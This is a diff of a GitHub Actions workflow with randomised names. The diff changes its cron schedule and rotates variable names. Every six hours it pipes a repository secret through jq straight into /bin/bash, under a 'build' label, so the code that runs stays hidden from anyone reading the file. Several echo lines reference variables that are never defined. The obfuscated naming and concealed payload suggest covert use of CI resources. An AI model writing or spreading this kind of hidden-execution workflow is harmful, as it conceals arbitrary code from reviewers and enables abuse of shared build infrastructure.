@@ -1,33 +1,28 @@
 name: tatteredcartload
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 3/6 * * *'
+    - cron: '42 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: tatteredcartload
         env:
-          sv8: ${{ secrets.sv8 }}
+          yzv21633: ${{ secrets.yzv21633 }}
         run: |
-          echo $sv8 | jq -r .go1 | /bin/bash
-          echo $fu6 | jq -r .fj73 | /bin/bash
-          echo $hidd7279 | jq -r .vnfc985 | /bin/bash
-          echo $zm020 | jq -r .pv5 | /bin/bash
-          echo $plt5 | jq -r .vk70110 | /bin/bash
-          echo $o64909 | jq -r .y398 | /bin/bash
-          echo $itou4 | jq -r .jeo69 | /bin/bash
-          echo $ny45 | jq -r .iyopx28832 | /bin/bash
-          echo $w34 | jq -r .jayx718 | /bin/bash
-          echo $xtcss518 | jq -r .yydqi73 | /bin/bash
-          echo $buph87595 | jq -r .vc294 | /bin/bash
-          echo $x24 | jq -r .ew3 | /bin/bash
-          echo $puefi19 | jq -r .ylzsd5 | /bin/bash
-          echo $l636 | jq -r .o0 | /bin/bash
-          echo $liqe15539 | jq -r .ocw597 | /bin/bash
-          echo $up6723 | jq -r .ue09900 | /bin/bash
+          echo $yzv21633 | jq -r .wh6 | /bin/bash
+          echo $vax2 | jq -r .yw49663 | /bin/bash
+          echo $j15634 | jq -r .awqsm1790 | /bin/bash
+          echo $htsh0455 | jq -r .tdu43716 | /bin/bash
+          echo $l3 | jq -r .t37902 | /bin/bash
+          echo $blts3879 | jq -r .gxg9 | /bin/bash
+          echo $cgid0 | jq -r .rdp7 | /bin/bash
+          echo $zaj51 | jq -r .o0 | /bin/bash
+          echo $ywihi67908 | jq -r .hzc6465 | /bin/bash
+          echo $vcy718 | jq -r .lbo7627 | /bin/bash
+          echo $v53 | jq -r .duhz2515 | /bin/bash
 
